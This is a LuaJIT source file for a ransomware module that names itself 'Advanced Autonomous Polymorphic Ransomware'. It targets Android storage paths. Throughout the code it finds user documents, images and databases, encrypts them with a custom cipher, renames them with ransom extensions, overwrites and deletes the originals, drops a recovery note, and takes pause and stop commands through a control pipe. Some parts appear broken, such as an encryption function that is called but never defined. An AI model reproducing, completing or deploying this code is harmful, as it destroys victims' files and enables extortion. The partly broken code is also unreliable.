local bit32 = require("bit32")
local ffi = require("ffi")
local json = require("cjson")

ffi.cdef[[
    void *malloc(size_t size);
    void free(void *ptr);
    void *memset(void *s, int c, size_t n);
    int rand(void);
    void srand(unsigned int seed);
    time_t time(time_t *tloc);
    int open(const char *pathname, int flags, mode_t mode);
    int close(int fd);
    ssize_t read(int fd, void *buf, size_t count);
    ssize_t write(int fd, const void *buf, size_t count);
    off_t lseek(int fd, off_t offset, int whence);
    int unlink(const char *pathname);
    int rename(const char *oldpath, const char *newpath);
    int fsync(int fd);
    int nanosleep(const struct timespec *req, struct timespec *rem);
    typedef struct { time_t tv_sec; long tv_nsec; } timespec;
    int getpid(void);
    unsigned int sleep(unsigned int seconds);
    void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    int munmap(void *addr, size_t length);
    int madvise(void *addr, size_t length, int advice);
    int ftruncate(int fd, off_t length);
    int fstat(int fd, struct stat *buf);
    int mkdir(const char *pathname, mode_t mode);
    DIR *opendir(const char *name);
    struct dirent *readdir(DIR *dirp);
    int closedir(DIR *dirp);
    int rmdir(const char *pathname);
    int chmod(const char *pathname, mode_t mode);
    int getentropy(void *buf, size_t len);
    char *getenv(const char *name);
    void *EVP_CIPHER_CTX_new(void);
    void EVP_CIPHER_CTX_free(void *ctx);
    int EVP_DecryptInit_ex(void *ctx, const void *cipher, void *impl, const unsigned char *key, const unsigned char *iv);
    int EVP_DecryptUpdate(void *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl);
    int EVP_DecryptFinal_ex(void *ctx, unsigned char *out, int *outl);
    const void *EVP_aes_256_gcm(void);
    int PKCS5_PBKDF2_HMAC(const char *pass, int passlen, const unsigned char *salt, int saltlen, int iter, const void *digest, int keylen, unsigned char *out);
    const void *EVP_sha256(void);
]]

local Ransomware = {
    _VERSION = "10.0",
    _AUTHOR = "Phobos Group",
    _DESCRIPTION = "Advanced Autonomous Polymorphic Ransomware",
    _state = {
        running = true,
        paused = false,
        stopped = false,
        current_target = "",
        processed_files = 0,
        processed_dirs = 0,
        total_processed_size = 0,
        start_time = 0
    },
    _callbacks = {
        on_start = nil,
        on_pause = nil,
        on_resume = nil,
        on_stop = nil,
        on_file_encrypt = nil,
        on_dir_encrypt = nil,
        on_error = nil,
        on_heartbeat = nil
    },
    _config = {},
    _master_password = nil,
    _paths = {
        config_path = "",
        state_file = "",
        control_pipe = ""
    }
}

local function get_env_var(name, default)
    local env_val = ffi.C.getenv(name)
    if env_val ~= nil then
        return ffi.string(env_val)
    end
    return default
end

local function initialize_paths()
    Ransomware._paths.config_path = get_env_var("RNW_CONFIG_PATH", "/data/local/tmp/.sysconf.aes")
    Ransomware._paths.state_file = get_env_var("RNW_STATE_FILE", "/data/local/tmp/.encstate.aes")
    Ransomware._paths.control_pipe = get_env_var("RNW_CONTROL_PIPE", "/data/local/tmp/.ctrlpipe")
end

local function secure_random(length)
    local buffer = ffi.new("char[?]", length)
    if ffi.C.getentropy(buffer, length) == 0 then
        return ffi.string(buffer, length)
    end
    return nil
end

local function memory_secure_erase(ptr, size)
    if ptr and size > 0 then
        ffi.C.memset(ptr, 0, size)
    end
end

local function aes_gcm_decrypt(encrypted_data, password)
    local payload = json.decode(encrypted_data)
    
    local salt = ffi.new("unsigned char[?]", #payload.salt)
    ffi.C.memcpy(salt, payload.salt, #payload.salt)
    
    local nonce = ffi.new("unsigned char[?]", #payload.nonce)
    ffi.C.memcpy(nonce, payload.nonce, #payload.nonce)
    
    local ciphertext = ffi.new("unsigned char[?]", #payload.data)
    ffi.C.memcpy(ciphertext, payload.data, #payload.data)
    
    local key = ffi.new("unsigned char[32]")
    ffi.C.PKCS5_PBKDF2_HMAC(password, #password, salt, #salt, 100000, ffi.C.EVP_sha256(), 32, key)
    
    local ctx = ffi.C.EVP_CIPHER_CTX_new()
    if ctx == nil then return nil end
    
    ffi.C.EVP_DecryptInit_ex(ctx, ffi.C.EVP_aes_256_gcm(), nil, key, nonce)
    
    local plaintext = ffi.new("unsigned char[?]", #payload.data)
    local out_len = ffi.new("int[1]")
    local final_out_len = ffi.new("int[1]")
    
    ffi.C.EVP_DecryptUpdate(ctx, plaintext, out_len, ciphertext, #payload.data)
    ffi.C.EVP_DecryptFinal_ex(ctx, plaintext + out_len[0], final_out_len)
    
    local result = ffi.string(plaintext, out_len[0] + final_out_len[0])
    
    ffi.C.EVP_CIPHER_CTX_free(ctx)
    memory_secure_erase(key, 32)
    memory_secure_erase(plaintext, #payload.data)
    
    return result
end

local function load_encrypted_config(password)
    local fd = ffi.C.open(Ransomware._paths.config_path, ffi.C.O_RDONLY)
    if fd == -1 then return false end
    
    local size = ffi.C.lseek(fd, 0, ffi.C.SEEK_END)
    ffi.C.lseek(fd, 0, ffi.C.SEEK_SET)
    local buffer = ffi.new("char[?]", size)
    ffi.C.read(fd, buffer, size)
    ffi.C.close(fd)
    
    local encrypted_data = ffi.string(buffer, size)
    local decrypted_data = aes_gcm_decrypt(encrypted_data, password)
    memory_secure_erase(buffer, size)
    
    if not decrypted_data then return false end
    
    local config = json.decode(decrypted_data)
    for k, v in pairs(config) do
        Ransomware._config[k] = v
    end
    
    memory_secure_erase(ffi.cast("void*", decrypted_data), #decrypted_data)
    Ransomware._master_password = password
    return true
end

local function get_config_value(key, default)
    local value = Ransomware._config[key]
    if not value then return default end
    return value
end

local function save_state()
    local state_data = json.encode({
        running = Ransomware._state.running,
        paused = Ransomware._state.paused,
        stopped = Ransomware._state.stopped,
        current_target = Ransomware._state.current_target,
        processed_files = Ransomware._state.processed_files,
        processed_dirs = Ransomware._state.processed_dirs,
        total_processed_size = Ransomware._state.total_processed_size,
        start_time = Ransomware._state.start_time
    })
    
    local encrypted_data = aes_gcm_encrypt(state_data, Ransomware._master_password)
    local fd = ffi.C.open(Ransomware._paths.state_file, ffi.C.O_WRONLY | ffi.C.O_CREAT | ffi.C.O_TRUNC, 384)
    if fd == -1 then return false end
    ffi.C.write(fd, encrypted_data, #encrypted_data)
    ffi.C.fsync(fd)
    ffi.C.close(fd)
    memory_secure_erase(ffi.cast("void*", encrypted_data), #encrypted_data)
    return true
end

local function load_state()
    local fd = ffi.C.open(Ransomware._paths.state_file, ffi.C.O_RDONLY)
    if fd == -1 then return false end
    
    local size = ffi.C.lseek(fd, 0, ffi.C.SEEK_END)
    ffi.C.lseek(fd, 0, ffi.C.SEEK_SET)
    local buffer = ffi.new("char[?]", size)
    ffi.C.read(fd, buffer, size)
    ffi.C.close(fd)
    
    local encrypted_data = ffi.string(buffer, size)
    local decrypted_data = aes_gcm_decrypt(encrypted_data, Ransomware._master_password)
    memory_secure_erase(buffer, size)
    
    if not decrypted_data then return false end
    
    local state = json.decode(decrypted_data)
    Ransomware._state.running = state.running
    Ransomware._state.paused = state.paused
    Ransomware._state.stopped = state.stopped
    Ransomware._state.current_target = state.current_target
    Ransomware._state.processed_files = state.processed_files
    Ransomware._state.processed_dirs = state.processed_dirs
    Ransomware._state.total_processed_size = state.total_processed_size
    Ransomware._state.start_time = state.start_time
    
    memory_secure_erase(ffi.cast("void*", decrypted_data), #decrypted_data)
    return true
end

local function check_control_signals()
    local fd = ffi.C.open(Ransomware._paths.control_pipe, ffi.C.O_RDONLY | ffi.C.O_NONBLOCK)
    if fd == -1 then return end
    
    local buffer = ffi.new("char[16]")
    local bytes = ffi.C.read(fd, buffer, 16)
    ffi.C.close(fd)
    
    if bytes > 0 then
        local command = ffi.string(buffer, bytes)
        if command == "PAUSE" and Ransomware._callbacks.on_pause then
            Ransomware._state.paused = true
            Ransomware._callbacks.on_pause()
        elseif command == "RESUME" and Ransomware._callbacks.on_resume then
            Ransomware._state.paused = false
            Ransomware._callbacks.on_resume()
        elseif command == "STOP" and Ransomware._callbacks.on_stop then
            Ransomware._state.stopped = true
            Ransomware._state.running = false
            Ransomware._callbacks.on_stop()
        elseif command == "STATUS" and Ransomware._callbacks.on_heartbeat then
            Ransomware._callbacks.on_heartbeat(Ransomware.get_status())
        end
    end
end

local function adaptive_sleep(base_delay, processed_size)
    local scaled_delay = base_delay * (1 + math.log(1 + processed_size / (1024 * 1024)))
    local ts = ffi.new("struct timespec")
    ts.tv_sec = math.floor(scaled_delay)
    ts.tv_nsec = (scaled_delay - math.floor(scaled_delay)) * 1e9
    ffi.C.nanosleep(ts, nil)
end

local function generate_entropy_pool()
    local entropy_path = get_config_value("entropy_source", "/proc/stat")
    local entropy = ""
    entropy = entropy .. tostring(ffi.C.time(nil))
    entropy = entropy .. tostring(ffi.C.getpid())
    
    local stat_fd = ffi.C.open(entropy_path, ffi.C.O_RDONLY)
    if stat_fd ~= -1 then
        local buffer = ffi.new("char[1024]")
        local bytes = ffi.C.read(stat_fd, buffer, 1024)
        if bytes > 0 then
            entropy = entropy .. ffi.string(buffer, bytes)
        end
        ffi.C.close(stat_fd)
    end
    
    return entropy
end

local function derive_cryptographic_key(entropy, rounds)
    local key = entropy
    for round = 1, rounds do
        local new_key = ""
        for i = 1, #key do
            local char = key:byte(i)
            local entropy_char = entropy:byte((i + round - 1) % #entropy + 1)
            local transformed = bit32.bxor(char, entropy_char, round % 256)
            transformed = bit32.rol(transformed, (i + round) % 8)
            transformed = (transformed * 16777619) % 256
            new_key = new_key .. string.char(transformed)
        end
        key = new_key
    end
    return key:sub(1, 64)
end

local function polymorphic_cipher(data, key, round)
    local result = ""
    local key_len = #key
    
    for i = 1, #data do
        local data_byte = data:byte(i)
        local key_byte = key:byte((i + round - 1) % key_len + 1)
        
        local transformed = bit32.bxor(data_byte, key_byte)
        transformed = bit32.rol(transformed, (i + key_byte + round) % 8)
        
        if round % 3 == 0 then
            transformed = bit32.bxor(transformed, (i * round) % 256)
        end
        
        result = result .. string.char(transformed)
    end
    
    return result
end

local function secure_erase_path(path)
    local fd = ffi.C.open(path, ffi.C.O_RDWR)
    if fd == -1 then return false end
    
    local stat_buf = ffi.new("struct stat")
    if ffi.C.fstat(fd, stat_buf) == -1 then
        ffi.C.close(fd)
        return false
    end
    
    local size = stat_buf.st_size
    local buffer_size = math.min(1024 * 1024, size)
    local wipe_buffer = ffi.new("char[?]", buffer_size)
    
    for i = 1, buffer_size do
        wipe_buffer[i-1] = math.random(0, 255)
    end
    
    for pass = 1, 3 do
        ffi.C.lseek(fd, 0, ffi.C.SEEK_SET)
        local remaining = size
        while remaining > 0 do
            local write_size = math.min(buffer_size, remaining)
            ffi.C.write(fd, wipe_buffer, write_size)
            remaining = remaining - write_size
        end
        ffi.C.fsync(fd)
    end
    
    ffi.C.close(fd)
    ffi.C.unlink(path)
    return true
end

local function encrypt_file_chunked(filepath, master_key, chunk_size)
    local fd_in = ffi.C.open(filepath, ffi.C.O_RDONLY)
    if fd_in == -1 then return false end
    
    local stat_buf = ffi.new("struct stat")
    if ffi.C.fstat(fd_in, stat_buf) == -1 then
        ffi.C.close(fd_in)
        return false
    end
    
    local file_size = stat_buf.st_size
    local temp_path = filepath .. ".tmpenc"
    local fd_out = ffi.C.open(temp_path, ffi.C.O_WRONLY | ffi.C.O_CREAT | ffi.C.O_TRUNC, 384)
    if fd_out == -1 then
        ffi.C.close(fd_in)
        return false
    end
    
    local file_key = derive_cryptographic_key(master_key .. filepath, 100)
    local buffer = ffi.new("char[?]", chunk_size)
    local rounds = 7
    
    for offset = 0, file_size - 1, chunk_size do
        if Ransomware._state.paused then
            while Ransomware._state.paused do
                check_control_signals()
                ffi.C.sleep(1)
            end
        end
        
        if Ransomware._state.stopped then
            ffi.C.close(fd_in)
            ffi.C.close(fd_out)
            ffi.C.unlink(temp_path)
            return false
        end
        
        check_control_signals()
        
        local read_size = math.min(chunk_size, file_size - offset)
        ffi.C.lseek(fd_in, offset, ffi.C.SEEK_SET)
        local bytes_read = ffi.C.read(fd_in, buffer, read_size)
        
        if bytes_read <= 0 then break end
        
        local chunk_data = ffi.string(buffer, bytes_read)
        local encrypted_chunk = chunk_data
        
        for round = 1, rounds do
            encrypted_chunk = polymorphic_cipher(encrypted_chunk, file_key, round)
            if round % 2 == 0 then
                encrypted_chunk = string.reverse(encrypted_chunk)
            end
        end
        
        ffi.C.write(fd_out, encrypted_chunk, #encrypted_chunk)
        
        if file_size > 10 * 1024 * 1024 then
            adaptive_sleep(0.001, read_size)
        end
    end
    
    ffi.C.fsync(fd_out)
    ffi.C.close(fd_in)
    ffi.C.close(fd_out)
    
    local extensions = get_config_value("file_extensions", ".crypt,.locked,.encrypted,.ransom,.janus")
    local extension_list = {}
    for ext in extensions:gmatch("[^,]+") do
        table.insert(extension_list, ext)
    end
    local new_extension = extension_list[math.random(#extension_list)]
    local new_filename = filepath .. new_extension
    
    if ffi.C.rename(temp_path, new_filename) == -1 then
        ffi.C.unlink(temp_path)
        return false
    end
    
    secure_erase_path(filepath)
    return true, file_size
end

local function encrypt_directory(dirpath, master_key)
    local dir_key = derive_cryptographic_key(master_key .. dirpath, 100)
    local dir_name_encrypted = polymorphic_cipher(dirpath, dir_key, 5)
    
    local new_dir_name = dirpath .. ".encrypted"
    if ffi.C.rename(dirpath, new_dir_name) == -1 then
        return false
    end
    
    local access_note = get_config_value("access_note", "Secure Archive - Contact Administrator")
    local note_path = new_dir_name .. "/" .. get_config_value("note_filename", "README_RECOVER.txt")
    local note_fd = ffi.C.open(note_path, ffi.C.O_WRONLY | ffi.C.O_CREAT | ffi.C.O_TRUNC, 420)
    if note_fd ~= -1 then
        ffi.C.write(note_fd, access_note, #access_note)
        ffi.C.fsync(note_fd)
        ffi.C.close(note_fd)
    end
    
    ffi.C.chmod(new_dir_name, 288)
    
    return true
end

local function discover_targets()
    local targets = {}
    local root_paths_str = get_config_value("target_paths", "/sdcard,/storage,/mnt,/data")
    
    for path in root_paths_str:gmatch("[^,]+") do
        local dir = ffi.C.opendir(path)
        if dir ~= nil then
            ffi.C.closedir(dir)
            table.insert(targets, path)
        end
    end
    
    local function traverse_directory(current_path, result)
        local dir = ffi.C.opendir(current_path)
        if dir == nil then return end
        
        local entry
        while true do
            entry = ffi.C.readdir(dir)
            if entry == nil then break end
            
            local name = ffi.string(entry.d_name)
            if name ~= "." and name ~= ".." then
                local full_path = current_path .. "/" .. name
                
                if entry.d_type == 4 then
                    local blacklist_str = get_config_value("dir_blacklist", "/proc,/sys,/dev,/cache,/config,/firmware,/persist,/metadata,/android,/system")
                    local skip = false
                    for pattern in blacklist_str:gmatch("[^,]+") do
                        if full_path:find(pattern, 1, true) then
                            skip = true
                            break
                        end
                    end
                    
                    if not skip then
                        table.insert(result, {path = full_path, type = "directory"})
                        traverse_directory(full_path, result)
                    end
                elseif entry.d_type == 8 then
                    local full_path = current_path .. "/" .. name
                    local ext_whitelist_str = get_config_value("file_extensions_whitelist", ".doc,.docx,.xls,.xlsx,.pdf,.jpg,.jpeg,.png,.sql,.db,.mdb,.py,.lua,.txt,.xml,.json")
                    local allowed = false
                    for ext in ext_whitelist_str:gmatch("[^,]+") do
                        if name:sub(-#ext) == ext then
                            allowed = true
                            break
                        end
                    end
                    
                    if allowed then
                        table.insert(result, {path = full_path, type = "file"})
                    end
                end
            end
        end
        ffi.C.closedir(dir)
    end
    
    local all_targets = {}
    for _, root_path in ipairs(targets) do
        traverse_directory(root_path, all_targets)
    end
    
    for i = #all_targets, 2, -1 do
        local j = math.random(i)
        all_targets[i], all_targets[j] = all_targets[j], all_targets[i]
    end
    
    return all_targets
end

function Ransomware.set_callback(event, func)
    if Ransomware._callbacks[event] ~= nil then
        Ransomware._callbacks[event] = func
        return true
    end
    return false
end

function Ransomware.initialize(custom_config_path, custom_state_file, custom_control_pipe, password)
    if custom_config_path then Ransomware._paths.config_path = custom_config_path end
    if custom_state_file then Ransomware._paths.state_file = custom_state_file end
    if custom_control_pipe then Ransomware._paths.control_pipe = custom_control_pipe end
    
    if not load_encrypted_config(password) then
        return false
    end
    return true
end

function Ransomware.execute_encryption_phase()
    if not Ransomware._master_password then
        initialize_paths()
        local password = get_env_var("RNW_PASSWORD", "")
        if password == "" or not load_encrypted_config(password) then
            if Ransomware._callbacks.on_error then
                Ransomware._callbacks.on_error("Failed to load encrypted configuration")
            end
            return nil
        end
    end
    
    Ransomware._state.start_time = ffi.C.time(nil)
    load_state()
    
    if Ransomware._callbacks.on_start then
        Ransomware._callbacks.on_start()
    end
    
    local entropy = generate_entropy_pool()
    local master_key = derive_cryptographic_key(entropy, 1000)
    local encrypted_files = 0
    local encrypted_dirs = 0
    local total_size = 0
    
    local targets = discover_targets()
    
    for _, target in ipairs(targets) do
        if Ransomware._state.stopped then break end
        
        Ransomware._state.current_target = target.path
        save_state()
        
        check_control_signals()
        
        if target.type == "file" then
            local fd = ffi.C.open(target.path, ffi.C.O_RDONLY)
            if fd == -1 then goto continue end
            
            local stat_buf = ffi.new("struct stat")
            if ffi.C.fstat(fd, stat_buf) == -1 then
                ffi.C.close(fd)
                goto continue
            end
            
            local file_size = stat_buf.st_size
            ffi.C.close(fd)
            
            if file_size < tonumber(get_config_value("min_file_size", "1024")) or 
               file_size > tonumber(get_config_value("max_file_size", "104857600")) then
                goto continue
            end
            
            local chunk_size = tonumber(get_config_value("chunk_size", "65536"))
            if file_size > 10 * 1024 * 1024 then
                chunk_size = 524288
            elseif file_size > 100 * 1024 * 1024 then
                chunk_size = 1048576
            end
            
            local success, size = encrypt_file_chunked(target.path, master_key, chunk_size)
            if success then
                encrypted_files = encrypted_files + 1
                total_size = total_size + size
                Ransomware._state.processed_files = encrypted_files
                Ransomware._state.total_processed_size = total_size
                
                if Ransomware._callbacks.on_file_encrypt then
                    Ransomware._callbacks.on_file_encrypt(target.path, size)
                end
            end
        elseif target.type == "directory" then
            local success = encrypt_directory(target.path, master_key)
            if success then
                encrypted_dirs = encrypted_dirs + 1
                Ransomware._state.processed_dirs = encrypted_dirs
                
                if Ransomware._callbacks.on_dir_encrypt then
                    Ransomware._callbacks.on_dir_encrypt(target.path)
                end
            end
        end
        
        if (encrypted_files + encrypted_dirs) % 20 == 0 then
            save_state()
            adaptive_sleep(0.5, total_size)
        end
        
        ::continue::
    end
    
    Ransomware._state.running = false
    Ransomware._state.current_target = ""
    save_state()
    
    secure_erase_path(Ransomware._paths.state_file)
    
    return {
        files_encrypted = encrypted_files,
        dirs_encrypted = encrypted_dirs,
        total_size_mb = math.floor(total_size / (1024 * 1024)),
        encryption_key = master_key,
        execution_time = ffi.C.time(nil) - Ransomware._state.start_time
    }
end

function Ransomware.pause()
    Ransomware._state.paused = true
    save_state()
end

function Ransomware.resume()
    Ransomware._state.paused = false
    save_state()
end

function Ransomware.stop()
    Ransomware._state.stopped = true
    Ransomware._state.running = false
    save_state()
end

function Ransomware.get_status()
    return {
        running = Ransomware._state.running,
        paused = Ransomware._state.paused,
        stopped = Ransomware._state.stopped,
        current_target = Ransomware._state.current_target,
        processed_files = Ransomware._state.processed_files,
        processed_dirs = Ransomware._state.processed_dirs,
        total_processed_size = Ransomware._state.total_processed_size,
        execution_time = ffi.C.time(nil) - Ransomware._state.start_time
    }
end

function Ransomware.cleanup()
    secure_erase_path(Ransomware._paths.config_path)
    secure_erase_path(Ransomware._paths.state_file)
    secure_erase_path(Ransomware._paths.control_pipe)
    Ransomware._master_password = nil
end

return Ransomware